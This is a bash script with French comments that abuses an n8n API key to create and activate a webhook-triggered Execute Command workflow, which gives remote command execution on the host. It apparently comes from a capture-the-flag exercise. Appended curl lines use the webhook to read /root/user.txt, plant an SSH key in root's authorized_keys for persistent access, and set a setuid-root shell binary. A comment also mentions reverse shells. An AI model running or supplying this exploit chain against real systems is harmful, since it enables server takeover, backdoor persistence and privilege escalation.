#!/usr/bin/env bash

set -euo pipefail

N8N_URL="${N8N_URL:-http://127.0.0.1:5678}"

if [[ $# -eq 0 ]]; then
    echo "Usage: $0 '<commande>'" >&2
    echo "Exemple: $0 'id; hostname; pwd'" >&2
    exit 1
fi

if [[ -z "${N8N_API_KEY:-}" ]]; then
    echo "[-] N8N_API_KEY n'est pas definie." >&2
    exit 1
fi

COMMAND="$*"
RCE_PATH="cmd-$(date +%s)-$$"
WORKFLOW_JSON="/tmp/n8n-cmd-workflow-$$.json"
CREATE_RESPONSE="/tmp/n8n-cmd-create-response-$$.json"
ACTIVATE_RESPONSE="/tmp/n8n-cmd-activate-response-$$.json"

# Python encode la commande comme une vraie chaine JSON : les guillemets,
# backslashes et retours a la ligne ne cassent donc pas le workflow.
COMMAND="$COMMAND" RCE_PATH="$RCE_PATH" python3 - <<'PY' > "$WORKFLOW_JSON"
import json
import os

command = os.environ["COMMAND"]
path = os.environ["RCE_PATH"]

workflow = {
    "name": f"Command {path}",
    "nodes": [
        {
            "parameters": {
                "httpMethod": "GET",
                "path": path,
                "responseMode": "lastNode",
                "options": {},
            },
            "id": "webhook-node",
            "name": "Command Webhook",
            "type": "n8n-nodes-base.webhook",
            "typeVersion": 2,
            "position": [200, 300],
            "webhookId": path,
        },
        {
            "parameters": {"command": command},
            "id": "command-node",
            "name": "Execute Command",
            "type": "n8n-nodes-base.executeCommand",
            "typeVersion": 1,
            "position": [450, 300],
        },
    ],
    "connections": {
        "Command Webhook": {
            "main": [[{"node": "Execute Command", "type": "main", "index": 0}]]
        }
    },
    "settings": {},
}

print(json.dumps(workflow))
PY

echo "[*] Commande: $COMMAND"
echo "[*] Creation du workflow..."

HTTP_CODE=$(
    curl -sS \
        -o "$CREATE_RESPONSE" \
        -w '%{http_code}' \
        -X POST "$N8N_URL/api/v1/workflows" \
        -H "X-N8N-API-KEY: $N8N_API_KEY" \
        -H 'Content-Type: application/json' \
        --data-binary "@$WORKFLOW_JSON"
)

if [[ "$HTTP_CODE" != "200" && "$HTTP_CODE" != "201" ]]; then
    echo "[-] Creation refusee (HTTP $HTTP_CODE)." >&2
    python3 -m json.tool "$CREATE_RESPONSE" 2>/dev/null || cat "$CREATE_RESPONSE"
    exit 1
fi

WORKFLOW_ID=$(
    python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["id"])' \
        "$CREATE_RESPONSE"
)

echo "[+] Workflow: $WORKFLOW_ID"
echo "[*] Activation..."

ACTIVATE_CODE=$(
    curl -sS \
        -o "$ACTIVATE_RESPONSE" \
        -w '%{http_code}' \
        -X POST "$N8N_URL/api/v1/workflows/$WORKFLOW_ID/activate" \
        -H "X-N8N-API-KEY: $N8N_API_KEY"
)

if [[ "$ACTIVATE_CODE" != "200" ]]; then
    echo "[-] Activation refusee (HTTP $ACTIVATE_CODE)." >&2
    python3 -m json.tool "$ACTIVATE_RESPONSE" 2>/dev/null || cat "$ACTIVATE_RESPONSE"
    exit 1
fi

echo "[+] Workflow actif. Declenchement..."

# Un reverse shell garde la requete ouverte. Dans ce cas, le timeout curl est
# normal et le workflow continue a s'executer cote n8n.
curl -sS --max-time 8 "$N8N_URL/webhook/$RCE_PATH" || true
echo
echo "[+] Termine. Workflow ID: $WORKFLOW_ID"



curl -sS --get "http://127.0.0.1:5678/webhook/$RCE_PATH" --data-urlencode 'cmd=cat /root/user.txt'

curl -sS --get "http://127.0.0.1:5678/webhook/$RCE_PATH" --data-urlencode 'cmd=cat /proc/self/mountinfo'

curl -sS --get "http://127.0.0.1:5678/webhook/$RCE_PATH" --data-urlencode "cmd=install -d -m 700 -o 1001 -g 1001 /root/.ssh; touch /root/.ssh/authorized_keys; grep -qxF '$PUBKEY' /root/.ssh/authorized_keys || printf '%s\n' '$PUBKEY' >> /root/.ssh/authorized_keys; chown 1001:1001 /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys; stat -c '%u:%g %a %n' /root/.ssh /root/.ssh/authorized_keys"

curl -sS --get "http://127.0.0.1:5678/webhook/$RCE_PATH" --data-urlencode 'cmd=ls /root'

curl -sS --get "http://127.0.0.1:5678/webhook/$RCE_PATH" --data-urlencode 'cmd=chown 0:0 /root/bashtemp && chmod 4755 /root/bashtemp && stat -c "%U:%G %a %n" /root/bashtemp'